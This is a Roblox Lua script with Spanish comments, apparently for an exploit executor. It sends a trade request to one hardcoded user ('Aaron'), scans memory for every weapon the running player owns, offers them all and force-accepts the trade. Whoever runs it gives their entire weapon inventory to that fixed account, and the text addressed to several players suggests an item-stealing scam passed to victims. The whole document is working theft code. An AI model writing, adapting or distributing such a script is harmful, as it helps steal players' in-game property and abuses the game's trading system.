-- Paso 1: Enviar el trade a Aaron (AARON287240)
local targetUserId = 10631566712
local targetPlayer = nil

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if not targetPlayer then
    warn("Aaron no está en este servidor. ¡Entren al mismo juego!")
    return
end

-- Enviar solicitud
pcall(function()
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
end)
print("¡Solicitud de trade enviada a Aaron!")

-- Esperar un momento a que se abra la ventana de intercambio
task.wait(1.5)

-- Paso 2: Extraer TODAS las armas del inventario
local weaponsList = {}
local seen = {}

pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            local weapons = rawget(obj, "Weapons")
            if type(weapons) == "table" then
                local owned = rawget(weapons, "Owned")
                if type(owned) == "table" then
                    for k, val in pairs(owned) do
                        local weaponId = tonumber(k) and val or k
                        if type(weaponId) == "string" and not seen[weaponId] then
                            seen[weaponId] = true
                            table.insert(weaponsList, weaponId)
                        end
                    end
                end
            end
        end
    end
end)

pcall(function()
    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, desc in ipairs(playerGui:GetDescendants()) do
            if desc:IsA("GuiObject") then
                local itemId = desc:GetAttribute("ItemID")
                if itemId and type(itemId) == "string" and not seen[itemId] then
                    seen[itemId] = true
                    table.insert(weaponsList, itemId)
                end
            end
        end
    end
end)

print("¡Se detectaron " .. #weaponsList .. " armas para ofrecer!")

-- Paso 3: Ofrecer cada arma detectada al trade
for _, weaponName in ipairs(weaponsList) do
    pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(weaponName, "Weapons")
    end)
    task.wait(0.12)
end

task.wait(0.5)

-- Paso 4: Escanear la memoria en busca del ID de trade activo actual y aceptar
local foundTradeId = nil
pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            -- Buscamos si hay algún ID numérico de trade o sesión activa en las tablas del juego
            for k, v in pairs(obj) do
                if (k == "TradeID" or k == "CurrentTrade" or k == "SessionID") and type(v) == "number" then
                    foundTradeId = v
                    break
                end
            end
        end
        if foundTradeId then break end
    end
end)

-- Si no encuentra el ID exacto en la memoria, usamos un respaldo o intentamos aceptar directo
local acceptArgs = {
    [1] = foundTradeId or 428469873, -- Si lo encuentra lo usa, si no usa el genérico por si el juego lo ignora
    [2] = os.clock() * 1000
}

local successAccept, errAccept = pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acceptArgs))
end)

if successAccept then
    print("¡Proceso completado: Armas ofrecidas y trade aceptado!")
else
    warn("Aviso al aceptar (las armas ya deberían estar en el trade): " .. tostring(errAccept))
end
